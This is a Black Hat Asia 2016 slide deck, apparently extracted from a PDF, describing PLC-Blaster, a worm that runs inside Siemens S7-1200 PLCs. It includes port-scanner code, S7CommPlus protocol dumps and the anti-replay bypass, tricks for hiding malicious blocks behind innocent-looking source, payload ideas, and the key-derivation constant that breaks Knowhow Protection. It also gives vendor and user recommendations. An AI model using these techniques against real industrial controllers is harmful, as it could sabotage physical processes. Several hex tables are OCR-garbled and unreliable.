# PLC-BLASTER

A Worm Living Solely in the PLC

## OpenSource Security

- · Linux Security
- · Pentesting Embedded Systems
- · Pentesting RFID Systems
- · Pentesting Industrial Control Systems

![](_page_1_Picture_5.jpeg)

### S7-1211

- · Built for small applications
- 50kb RAM
- 1MB persistent memory
- Built-in Ethernet
- V3.0 & TIAv11

![](_page_2_Picture_6.jpeg)

### How PLCs Work

![](_page_3_Figure_2.jpeg)

![](_page_4_Picture_0.jpeg)

# Program Organization Blocks

- · OB (OrganizationBlock):
- · FB (FunctionBlock):
- · SFB (SystemFunctionBlock) Library
- · FC (Function):
- · SFC(SystemFunction)
- · DB (DataBlock):

Entry point Class with one method Function Library Global memory

### Programming Languages

#### Ladder Diagram

### Sequential Function Chart

+ T3

T2 Tran2

T3

ST

Trans

ST Start

S3

11 and 12

![](_page_5_Figure_3.jpeg)

### Instruction List

| 1     | L | "IN PUTTLE" |  |
|-------|---|-------------|--|
| 2<br> | 0 | "INPUT2"    |  |
| 3     |   | "OUTPUT"    |  |

![](_page_6_Picture_0.jpeg)

### Worm

- · Target discovery?
- Carrier .
- · Activation
- · Payloads

![](_page_7_Picture_0.jpeg)

Target Discovery I

- · TCP port 102 is open on all S7-PLCs
- · Implement a portscanner
	- TCON: Open a new TCP connection
	- TDISCON: Close a TCP connection

### Target Discovery II

IF "data".con state = 10 THEN

END IF;

```
"TCON DB" (REQ : = "data" . action,
          ID:=1,
          DONE=>"data".con_done,
          BUSY=>"data".con busy,
          ERROR=>"data".con error,
          STATUS=>"data".con status,
          CONNECT : = "data" . con param) ;
IF "data".con done = True THEN
  "data".con_state := 20;
  "data".con timeout counter := 0;
ELSE
  "data".con_timeout_counter := "data".con_timeout_counter + 1;
  IF "data".con timeout counter > 200 THEN
    "data".con state := 0;
  END_IF;
END IF;
GOTO CYCLE END;
```
## Target Discovery III

#### IF "data".con state = 0 THEN

```
"TDISCON DB" (REQ : = "data" . action,
             ID := 1 ,
             DONE=>"data".con done,
             BUSY=>"data".con busy,
             ERROR=>"data".con error,
             STATUS=>"data".con_status) ;
IF "data".con error = True OR
  "data".con done = True
THEN
  "data".con param.REM STADDR[4] := ("data".con param.REM STADDR[4] + 1) MOD 255;
  "data".con_timeout_counter := 0;
  "data".con_state := 10;
END IF;
```

```
GOTO CYCLE END;
END_IF;
```
![](_page_10_Picture_0.jpeg)

### Worm

- · Target discovery ✔
	- Portscanner (TCP 102); TCON, DISCON
- · Carrier?
- · Activation
- · Payloads

![](_page_11_Picture_0.jpeg)

### Carrier

- · Program transfer via TCP to the PLC
- · Implement the transfer protocol
	- TSEND, TRCV

## Protocol Analysis I

- · S7CommPlus
	- Binary
	- Proprietary -
	- Huge differences compared to the old S7-300/400 protocol
	- Modified in S7-1200v4 and S7-1500
	- Transfer of programs
	- Start/Stop CPU ।
	- Read/Write process variables

![](_page_12_Figure_9.jpeg)

### Protocol Analysis II

Message 1: Connection setup

![](_page_13_Picture_2.jpeg)

|                                                                           |    |      |          |                             |  | Magic                         |         | Len |                         | Reserved |          |                                                      |  |
|---------------------------------------------------------------------------|----|------|----------|-----------------------------|--|-------------------------------|---------|-----|-------------------------|----------|----------|------------------------------------------------------|--|
|                                                                           |    | TPKT |          | SO8073                      |  |                               | Version |     | Type                    |          | Sub-Type |                                                      |  |
| 0000023                                                                   |    |      |          |                             |  |                               |         |     |                         |          |          | 03 00 00 df 02 £0 80 72 001 00 d0 31 00 00 04 ca r 1 |  |
| Seq no.                                                                   |    |      | 00 00 00 | 02 00 00 01 20              |  |                               |         |     | 36 00 00 01 1d 00 04 00 |          |          |                                                      |  |
|                                                                           | 00 |      | 00 00 00 |                             |  | a1 00 00 00 d3 82             |         | 1 F | 00 00                   |          | a3 81 69 |                                                      |  |
| 00000053                                                                  |    |      |          |                             |  | 00 15 16 53 65 72 76 65 72 53 |         |     |                         |          |          | 65 73 73 69 6f 6e Serve rSession                     |  |
| 00000063 5f 33 33 32 33 34 41 37                                          |    |      |          |                             |  |                               | 41 aB   |     |                         |          |          | 82 21 00 15 2c 31  33234A7 A                         |  |
| 00000073  3a 3a 3a 36 2e 30 3a  54 48 50 2f 49 50 20 2d :::6.0:: TCP/IP - |    |      |          |                             |  |                               |         |     |                         |          |          |                                                      |  |
| 00000083 3e 20 49 6e 74 65 6c 28                                          |    |      |          |                             |  |                               |         |     |                         |          |          | 52 79 20 50 52 4f 2f 31 > Intel( R) PRO/1            |  |
| 00000093 30 30 30 30 20 4d 54 20 44                                       |    |      |          |                             |  |                               |         |     |                         |          |          | 2e 2e 2e a3 82 28 00 15 000 MT D (                   |  |
| 000000A3 000 a3 82 29 00 15 00 a3                                         |    |      |          |                             |  |                               |         |     |                         |          |          | 82 2a 00 15 0f 4d 41 49 ) .*MAI                      |  |
| 000000B3                                                                  |    |      |          | 4b 2d 50 43 5f 32 32 33     |  |                               |         |     |                         |          |          | 30 39 30 36 a3 82 2b 00 K-PC 223 0906+.              |  |
| 0000000C3                                                                 |    |      |          | 04 01 a3 82 2c 00 12 00     |  |                               | 2d      |     | c6 c0 a3 82 2d 00 15    |          |          |                                                      |  |
| OOOOOOOOOOOO                                                              |    |      |          | 00 a1 00 00 00 00 d3 81 7ff |  |                               | 0 0     |     |                         |          |          | 00 a3 81 69 00 15 15                                 |  |
| 0000000003  53 75 62 73 63 72 69 70                                       |    |      |          |                             |  |                               |         |     |                         |          |          | 69 6f 6e 43 6f 6e 74 Subscrip tionCont               |  |
| 000000F3 61 69 6e 65 72 a2 a2 00                                          |    |      |          |                             |  |                               |         |     |                         |          |          | 00 00 72 01 00 00    ainer r                         |  |
|                                                                           |    |      |          |                             |  |                               |         |     | Frame-End-Delimiter     |          |          |                                                      |  |

Black Hat Asia 2016: PLC-Blaster

### Protocol Analysis III

Message 1: Connection setup

![](_page_14_Picture_2.jpeg)

|                                                                           |                         |      |              |                                                      |             |  | Maqıc                   |         |                         | Len |                     | Reserved |    |          |                                                                 |  |
|---------------------------------------------------------------------------|-------------------------|------|--------------|------------------------------------------------------|-------------|--|-------------------------|---------|-------------------------|-----|---------------------|----------|----|----------|-----------------------------------------------------------------|--|
|                                                                           |                         | TPKT |              | SO8073                                               |             |  |                         | Version |                         |     | Type                |          |    | Sub-Type |                                                                 |  |
| 0000023                                                                   |                         |      |              | 03 00 00 df 02 f0 80 72 001 00 d0 31 00 00 04 ca r 1 |             |  |                         |         |                         |     |                     |          |    |          |                                                                 |  |
| Seq no.                                                                   | 00 00 00                |      |              | 02 00 00                                             |             |  | 01 20                   |         | 36 00 00 01 1d 00 04 00 |     |                     |          |    |          |                                                                 |  |
|                                                                           | 00                      |      | O O OTO TOTO |                                                      | a1 00 00 00 |  |                         |         | d3 82 1f 00             |     |                     | 00       | a3 | 81 69    |                                                                 |  |
| 0000053                                                                   |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 00 15 16 53 65 72 76 65  72 53 65 73 73 69 6f 6e Serve rSession |  |
| 00000063                                                                  | 5f 33 33 32 33 34 41 37 |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 41 a3 82 21 00 15 2c 31 _33234A7 A!,1                           |  |
| 00000073  3a 3a 3a 36 2e 30 3a  54 43 50 2f 49 50 20 2d :::6.0:: TCP/IP - |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          |                                                                 |  |
| 00000083 3e 20 49 6e 74 65 6c 28                                          |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 52 29 20 50 52 4f 2f 31 > Intel( R) PRO/1                       |  |
| 00000093 30 30 30 30 20 4d 54 20 44                                       |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 2e 2e 2e a3 82 28 00 15 000 MT D (                              |  |
| 000000A3  00 a3 82 29 00 15 00 a3                                         |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 82 2a 00 15 0f_4d 41 49 ) .*MAI                                 |  |
| 000000B3 -                                                                |                         |      |              |                                                      |             |  | 4b 2d 50 43 5f 32 32 33 |         | 30 39 30 36             |     |                     |          |    |          | a3 82 2b 00 K-PC 223 0906+.                                     |  |
| 0000000003 - 1                                                            |                         |      |              | 04 01 a3 82 2c 00 12 00                              |             |  |                         |         | 2d c6 c0 a3             |     |                     |          |    |          | 82 2d 00 15 ,                                                   |  |
| O O O O O OID B BOOK                                                      |                         |      |              | 00 a1 00 00 00 00 03 81 77                           |             |  |                         |         |                         |     |                     |          |    |          | 00 00 a3 81 69 00 15 15                                         |  |
| 0000000003  53 75 62 73 63 72 69 70                                       |                         |      |              |                                                      |             |  |                         |         |                         |     |                     |          |    |          | 74 69 6t 6e 43 6f 6e 74 Subscrip tionCont                       |  |
| 000000F3 61 69 6e 65 72 a2 a2 00                                          |                         |      |              |                                                      |             |  |                         |         | 0 0 100                 |     |                     |          |    |          | 00 72 01 00 00 ainer r.r                                        |  |
|                                                                           |                         |      |              |                                                      |             |  |                         |         |                         |     | Frame-End-Delimiter |          |    |          |                                                                 |  |

Black Hat Asia 2016: PLC-Blaster

### Attribute-Blocks |

![](_page_15_Figure_1.jpeg)

### Attribute-Blocks ||

![](_page_16_Figure_1.jpeg)

![](_page_17_Figure_0.jpeg)

### Numbers in Attribute-Blocks

![](_page_17_Figure_2.jpeg)

Black Hat Asia 2016: PLC-Blaster

### Anti-Replay Mechanism

#### Message 2: Connection setup

![](_page_18_Picture_2.jpeg)

| 00000023  03 00 00 89 02 £0 80 72  01 00 7a 32 00 00 04 ca r z2               |  |  |  |  |  |  |  |  |  |
|-------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|
| 00000033  00 00 00 02 36 11 02 87 22 87 3d a1 00 00 01 20 6 ".=               |  |  |  |  |  |  |  |  |  |
| 00000043 82 1f 00 00 a3 81 69 00 17 00 a3 82 32 00 17 00 i. 2                 |  |  |  |  |  |  |  |  |  |
| 00000053 00 01 3a 82 3b 00 04 82  00 82 3c 00 04 81 40 82 :.; <@.             |  |  |  |  |  |  |  |  |  |
| 00000063  3d 00 04 84 80 c0 40 82  3e 00 04 84 80 c0 40 82 =@. >@.            |  |  |  |  |  |  |  |  |  |
| 00000073  3f 00 15 1b 31 36 45  53 37 20 32 31 32 2d 31 ?1;6E \$7 212-1       |  |  |  |  |  |  |  |  |  |
| 00000083  42 45 33 31 2d 30 58 42  30 20 3b 56 33 2e 30 82 BB31-0XB 0  ;V3.0. |  |  |  |  |  |  |  |  |  |
| 00000093  40 00 15 05 32 3b 35 34  34 82 41 00 03 00 03 00 @2;54 4.A          |  |  |  |  |  |  |  |  |  |
| 000000A3  a2 00 00 00 00 72 01 00  00                                         |  |  |  |  |  |  |  |  |  |

$$\mathbf{22}\_{\text{(16)}} \mathbf{+80}\_{\text{(16)}} = \mathbf{A2}\_{\text{(16)}}$$

### Anti-Replay Mechanism

#### Message 3: Connection setup

![](_page_19_Picture_2.jpeg)

| 0000010B 03 00 00 8c 02 £0 80 72 02 00 7d 31 00 00 05 42 r }1B                                                                                                                 |  |  |  |  |  |  |  |  |  |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|
| 0000011B 00 00 03 00 00 03 a2 34 00 00 03 a2:01 01 82  4                                                                                                                       |  |  |  |  |  |  |  |  |  |
| 0000012B 32 01 00 17 00 00 01 3a  82 3b 00 04 82 00 82 3c 2: ::<                                                                                                               |  |  |  |  |  |  |  |  |  |
| 0000013B 00 04 81 40 82 3d 00 04 00 82 3e 00 04 84 80 c0 @.= >                                                                                                                 |  |  |  |  |  |  |  |  |  |
| 0000014B  40 82 3f 00 15 00 82 40  00 15 1a 31 3b 36 45 53 @.?@ 1;6ES                                                                                                          |  |  |  |  |  |  |  |  |  |
| 0000015B 37 20 32 31 32 2d 31 42 45 33 31 2d 30 7 212 - 18 33 - 0xB0                                                                                                           |  |  |  |  |  |  |  |  |  |
| 0000016B 3b 56 33 2e 30 82 41 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000 00 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 00000 |  |  |  |  |  |  |  |  |  |
| 0000017B  e8 89 69 00 12 00 00 00  00 89 6a 00 13 00 89 6b i jk                                                                                                                |  |  |  |  |  |  |  |  |  |
| 0000018B  00 04 00 00 00 00 00  72 02 00 00                                                                                                                                    |  |  |  |  |  |  |  |  |  |
|                                                                                                                                                                                |  |  |  |  |  |  |  |  |  |

$$\mathbf{22}\_{\text{(16)}} \mathbf{+} \mathbf{80}\_{\text{(16)}} = \mathbf{A2}\_{\text{(16)}}$$

### Transfer a Program

#### Message: Download block

![](_page_20_Picture_2.jpeg)

| 00000901  03 00 04 00 02 £0 00 72  02 05 a9 31 00 00 04 ca r 1       |  |  |  |  |  |  |  |  |  |  |
|----------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|--|
| 00000911  00 00 00 13 a2  34 00 00 00 03 00 04 00  4                 |  |  |  |  |  |  |  |  |  |  |
| 00000921 00 00 00 00 a1 8a 32 00  01 94 57 20 00 a3 81 69 2. W i     |  |  |  |  |  |  |  |  |  |  |
| 00000931 00 15 04 4 Blocktype 3 Blocknumber 2 8a 83 f9 bd Main       |  |  |  |  |  |  |  |  |  |  |
|                                                                      |  |  |  |  |  |  |  |  |  |  |
| 00000951 14 00 62 90 00 00 03 78 f9 81 db 20 c3 0c 30 bx             |  |  |  |  |  |  |  |  |  |  |
| 00000961  23 50 80 a1 79 09 58 3e  18 5a 9a 58 98 #P.,v.X> .Z.X.,X.  |  |  |  |  |  |  |  |  |  |  |
| 00000971  59 18 02 cb 53 54 2f 91  94 00 70 fb 06 9f 5f 6c YST/. p_l |  |  |  |  |  |  |  |  |  |  |
| 00000981 fc 9d e2 9d f3 £3 8a 4b  12 f3 4a 14 fc c0 c9 1e K J        |  |  |  |  |  |  |  |  |  |  |
|                                                                      |  |  |  |  |  |  |  |  |  |  |
|                                                                      |  |  |  |  |  |  |  |  |  |  |
|                                                                      |  |  |  |  |  |  |  |  |  |  |
|                                                                      |  |  |  |  |  |  |  |  |  |  |

### Transfer a Program

- · Transfer Attributes:
	- Some are used by the PLC
	- Some are used by TIA in case of program retrieval

(0x9315)

(0x9316)

(0x9311)

(0×9313)

(0xa140)

(0x936f)

(0x9370)

(0x9372)

(0×9359)

(0×935b)

(0x935c)

(0×935f)

(0×9360)

(0×9361)

- LastModified
- LoadMemorySize
- IdentFS
- WorkingMemorySize
- Comment
- InterfaceModified
- InterfaceDescription
- LineComments
- BlockNumber
- BlockLanquage
- KnowhowProtected
- Unlinked
- Fprotection
- RuntimeModified
- BodyDescription (0×9365) Binding (0x984f) · Optimizelnfo (0x9369) · TOblockSetNumber (0x9c23) Typelnfo (0xa362 . Code (0x9414 · ParameterModified (0x9415 NetworkComments (0x9418 NetworkTitles 0x9419 CalleeList 0x941a · InterfaceSignature (0x941b) Debuginfo 0x941d (0x941e) · LocalErrorHandling · LongConstants (0x941f) (0x9417)
	- · intRefData

Black Hat Asia 2016: PLC-Blaster

![](_page_22_Picture_0.jpeg)

### Fun with Attribute Blocks I

### · Data redundancy creates attack surface

![](_page_22_Figure_3.jpeg)

![](_page_23_Picture_0.jpeg)

### Fun with Attribute Blocks I

### · Data redundancy creates attack surface

![](_page_23_Figure_3.jpeg)

![](_page_24_Picture_0.jpeg)

### Fun with Attribute Blocks I

- · Allows you to download hidden blocks
- · Choose an existing blocknumber
- · TIA Portal recognizes only the original block
- Not working with data blocks

![](_page_25_Picture_0.jpeg)

### Fun with Attribute Blocks II

### · The code is transferred in two variants

#### Source code in XML displayed by TIA

```
<BC>
<Fold UId="23">
<NL UId="24" />
<BCL TE=" * This is a comment."/>
<NL UId="21" />
<BCL TE=" " />
<BCE/>
</Fold>
</BC>
<NL UId="42" />
<NL UId="38" />
<Statement TE="IF" UId="59" SI="IF">
```
#### Byte code executed by the PLC

02 4c 00 00 e0 02 4c 04 00 e0 02 4c 08 00 e0 02 4c Oc 00 e0 02 4c 10 00 e0 02 4c 14 00 f8 18 58 02 £8 18 58 06 18 40 01 £8 70 00 04 01 02 1a 40 6f 00 2c 7c 00 01 6c 05 01 68 00 68 01 14 40 01

![](_page_26_Picture_0.jpeg)

### Fun with Attribute Blocks II

- · Allows you to make your program source code look unsuspicious
- · But actually malicious binary code is executed

![](_page_27_Picture_0.jpeg)

## Fun with Attribute Blocks III

- · Some attribute blocks can be left out
- · You don't need to ship your worm's source code
- · Reduce the amount of data

![](_page_28_Picture_0.jpeg)

### Implement the Worm

- · Implement the worm using TIA:
	- connection setup
	- Anti-replay-protection
	- Create empty data blocks for messages
- · Transfer the worm to the PLC with TIA and capture pcaps
- · Retrieve the messages from the pcaps
- · Store the messages in the empty DBs
- · Inject the worm with your own tool

![](_page_29_Picture_0.jpeg)

### Worm

- · Target discovery ↓
	- Portscanner (TCP 102); TCON, DISCON
- · Carrier ✔
	- Implement the S7-Protocol; TSEND, TRCV
- · Activation?
- · Payloads

### Activation

- · OB (OrganizationBlock): int main()
- · Additional OBs are supported
- · OBs are executed sequentially
- · Original user program is untouched

![](_page_31_Picture_0.jpeg)

### Worm

- · Target discovery ↓
	- Portscanner (TCP 102); TCON, DISCON
- · Carrier ·
	- Implement the S7-Protocol; TSEND, TRCV
- · Activation ✔
	- Built-in
- · Payloads

![](_page_32_Picture_0.jpeg)

![](_page_32_Picture_1.jpeg)

- DoS .
- · Arbitrary manipulation of outputs
- · TCP-Functions
	- C&C-Server
	- Proxy ।
- . ..............................................................................................................................................................................

![](_page_33_Picture_0.jpeg)

### Worm

- · Target discovery ↓
	- Portscanner (TCP 102); TCON, DISCON
- · Carrier ✔
	- Implement the S7-Protocol; TSEND, TRCV
- · Activation ·
	- Built-in
- · Payloads ✔
	- A lot of possibilities

![](_page_34_Picture_0.jpeg)

### Demonstration

![](_page_34_Figure_2.jpeg)

Black Hat Asia 2016: PLC-Blaster

### Demonstration

![](_page_35_Figure_1.jpeg)

### Demonstration

![](_page_36_Figure_1.jpeg)

![](_page_37_Picture_0.jpeg)

### Impact on the PLC I

- · Program execution is stopped
	- Approximately 10s
- · Generates a log entry in the PLC
- · Possible worm improvements: patch existing OB1
	- Worm is more complex

| 2 | 12:11:17:276 am | 01.01.1970 | CPU info: Communication initiated request: WARM RESTART |
|---|-----------------|------------|---------------------------------------------------------|
| 3 | 12:11:17:276 am | 01.01.1970 | CPU info: New startup information                       |
| 4 | 12:11:02:876 am | 01.01.1970 | CPU info: New startup information                       |
| 5 | 12:11:01:761 am | 01.01.1970 | CPU info: New startup information                       |
| 6 | 12:11:01:061 am | 01.01.1970 | CPU info: New startup information                       |
| 7 | 12:11:00:961 am | 01.01.1970 | CPU info: Communication initiated request: STOP         |

### Impact on the PLC II

- · Memory usage
	- 38,5kb RAM
	- 216,6kb persistent memory

| Model   | RAM         | Persistent Memory |
|---------|-------------|-------------------|
| S7-1211 | 50kb (77%)  | 1Mb (21%)         |
| S7-1212 | 75kb (51%)  | 1MB (5 %)         |
| S7-1214 | 100kb (38%) | 4MB (5 %)         |
| S7-1215 | 125kb (30%) | 4MB (5 %)         |
| S7-1217 | 150kb (25%) | 4MB (5 %)         |

### Impact on the PLC III

- · Cycle time
	- Default cycle time: 150ms
	- Worm: max 7ms (4,7%)

![](_page_39_Figure_4.jpeg)

![](_page_40_Picture_0.jpeg)

### Persistence & Identification

- · Remove the worm:
	- Factory-Reset of the PLC
	- Override worm OB
- The TIA-Portal recognizes the worm

![](_page_41_Picture_0.jpeg)

![](_page_41_Picture_1.jpeg)

Project Edit View Insert Online Options Tools Window Help

A Start

#### Totally Integrated Automation

画| 六 (b) 圆 (3

11/6/2015

PORTAL

![](_page_42_Picture_3.jpeg)

![](_page_43_Picture_0.jpeg)

### Protection

- · S7-1200 provides 3 protection mechanisms:
	- Knowhow Protection
	- Copy Protection
	- Access Protection

![](_page_44_Picture_0.jpeg)

### Knowhow Protection

- · Prevents unauthorized reading or modification of the code
- · Password protection
- · Source-Code is AES encrypted

![](_page_44_Figure_5.jpeg)

SHA-1 hash of password

![](_page_45_Picture_0.jpeg)

### Knowhow Protection II

- · How to disable the Knowhow Protection?
	- Set enable flag to: 0×00, 0×00
- · Problem: source-code is still AES encrypted
- · How is the AES-Key generated?

![](_page_46_Picture_0.jpeg)

### Knowhow Protection II

- · Key derived from the hash:
	- K = truncate128Bit(SHA-1 HASH) XOR M
	- M = 0x28,0x6f,0x76,0x5c,0x6e,0x3b,0x1e,0x4c, 0xd0,0x8e,0x42,0x31,0x43,0x7b,0x8e,0xbf
- · Siemens Security Advisory: SSA-833048

![](_page_47_Picture_0.jpeg)

### Knowhow Protection IV

- Knowhow Protection is ineffective:
	- Broken ।
	- Only protects existing POUs

## Copy Proection

- · Restricts the program for use only with a specific PLC
- · Change of serial number possible
- · Attribute Block not evaluated by the PLC (client-side protection)
- Ineffective .
- · Siemens Security Advisory: SSA-833048

![](_page_48_Figure_6.jpeg)

### Access Protection

- · Limits S7CommPlus features
	- By Password
- · Works
- · By default disabled

| Function                  | Off | Write-<br>Protection | Write/Read-<br>Protection |
|---------------------------|-----|----------------------|---------------------------|
| Start/Stop CPU            | y   | n                    | n                         |
| Transfer Program to PLC   | y   | n                    | n                         |
| Retrieve Program from PLC | y   | y                    | n                         |
| Edit  Output/Input/Memory | y   | y                    | y                         |
| Read Identification       | y   | y                    |                           |
| Assign IP-Adress          | y   | y                    | y                         |
| Set time of day           | y   | n                    | n                         |
| Reset                     | y   | n                    | n                         |

### Improvements & Recommendations

- Vendor .
	- Access protection enabled by default
	- Integrity protection using checksums
	- Disable connections via TCON to port 102
- User .
	- Enable the access protection
	- Firewall restrictions (PLC opens the connection)

### Other Vendors?

- · PLC features required by the worm:
	- Industrial Ethernet
	- Program transfer via TCP to the PLC
	- Programmable TCP functions

### Leading Vendors

| Vendor              | Product              | Ethernet | Transfer TCP/UDP | TCP/IP Functions |
|---------------------|----------------------|----------|------------------|------------------|
| Siemens             | S7-300               | Ja       | Ja               | Ja               |
| Siemens             | S7-400               | Ja       | a                | a                |
| Siemens             | S7-1200              | Ja       | Ja               | Ja               |
| Siemens             | S7-1500              | Ja       | Ja               | a                |
| Mitsubishi Electric | MELSEC iQ-R          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC iQ-F          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-Q             | Ja       | Ja               | a                |
| Mitsubishi Electric | MELSEC-L             | Ja       | Ja               | a                |
| Mitsubishi Electric | MELSEC-F             | Ja       | a                | Nein             |
| Mitsubishi Electric | MELSEC-QS/WS         | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Easy M       | Nein     | Nein             | Nein             |
| Schneider Electric  | Modicon M            | a        | a                | Nein             |
| Schneider Electric  | Modicon LM           | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Premium      | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Quantum      | Ja       | Ja               | Nein             |
| Schneider Electric  | Preventa XPS Quantum | Ja       | Ja               | Nein             |
| Rockwell Automation | ControlLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | CompactLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | MicroLogix           | Ja       | Ja               | a                |
| Rockwell Automation | SmartGuard 600       | Ja       | Ja               | Nein             |
| Rockwell Automation | SLC 500              | Ja       | Ja               | a                |
| Rockwell Automation | PLC-5                | a        | a                | a                |
| Rockwell Automation | GuardPLC             | Ja       | Ja               | Nein             |
| Rockwell Automation | Micro800             | Ja       | Ja               | Nein             |

#### All leading vendors

### Leading Vendors Supporting Ethernet

| Vendor              | Product              | Ethernet | Transfer TCP/UDP | TCP/IP Functions |
|---------------------|----------------------|----------|------------------|------------------|
| Siemens             | S7-300               | Ja       | Ja               | Ja               |
| Siemens             | S7-400               | Ja       | Ja               | Ja               |
| Siemens             | S7-1200              | Ja       | Ja               | Ja               |
| Siemens             | S7-1500              | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC iQ-R          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC iQ-F          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-O             | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-L             | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-F             | Ja       | Ja               | Nein             |
| Mitsubishi Electric | MELSEC-OS/WS         | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Easy M       | Nein     | Nein             | Nein             |
| Schneider Electric  | Modicon M            | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon LM           | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Premium      | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Quantum      | Ja       | Ja               | Nein             |
| Schneider Electric  | Preventa XPS Quantum | Ja       | Ja               | Nein             |
| Rockwell Automation | ControlLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | CompactLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | MicroLogix           | Ja       | Ja               | Ja               |
| Rockwell Automation | SmartGuard 600       | Ja       | Ja               | Nein             |
| Rockwell Automation | SLC 500              | Ja       | Ja               | Ja               |
| Rockwell Automation | PLC-5                | Ja       | Ja               | Ja               |
| Rockwell Automation | GuardPLC             | Ja       | Ja               | Nein             |
| Rockwell Automation | Micro800             | Ja       | Ja               | Nein             |

All leading vendors supporting Industrial Ethernet and TCP/UDP transfer in their PLCs

### Leading Vendors Supporting TCP/IP Functions

| Vendor              | Product              | Ethernet | Transfer TCP/UDP | TCP/IP Functions |
|---------------------|----------------------|----------|------------------|------------------|
| Siemens             | S7-300               | Ja       | Ja               | Ja               |
| Siemens             | S7-400               | Ja       | Ja               | Ja               |
| Siemens             | S7-1200              | Ja       | Ja               | Ja               |
| Siemens             | S7-1500              | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC iQ-R          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC iQ-F          | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-O             | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-L             | Ja       | Ja               | Ja               |
| Mitsubishi Electric | MELSEC-F             | Ja       | Ja               | Nein             |
| Mitsubishi Electric | MELSEC-OS/WS         | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Easy M       | Nein     | Nein             | Nein             |
| Schneider Electric  | Modicon M            | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon LM           | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Premium      | Ja       | Ja               | Nein             |
| Schneider Electric  | Modicon Quantum      | Ja       | Ja               | Nein             |
| Schneider Electric  | Preventa XPS Quantum | Ja       | Ja               | Nein             |
| Rockwell Automation | ControlLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | CompactLogix         | Ja       | Ja               | Ja               |
| Rockwell Automation | MicroLogix           | Ja       | Ja               | Ja               |
| Rockwell Automation | SmartGuard 600       | Ja       | Ja               | Nein             |
| Rockwell Automation | SLC 500              | Ja       | Ja               | Ja               |
| Rockwell Automation | PLC-5                | Ja       | Ja               | Ja               |
| Rockwell Automation | GuardPLC             | Ja       | Ja               | Nein             |
| Rockwell Automation | Micro800             | Ja       | Ja               | Nein             |

All leading vendors supporting Industrial Ethernet and TCP/UDP transfer in their PLCs

All leading vendors supporting additionally TCP/IP functions

![](_page_55_Picture_0.jpeg)

Further Research

- · Analysis of more PLC vendors and models
- Infection via fieldbus protocols

![](_page_56_Picture_0.jpeg)

![](_page_56_Picture_1.jpeg)

 info@os-s.de

Black Hat Asia 2016: PLC-Blaster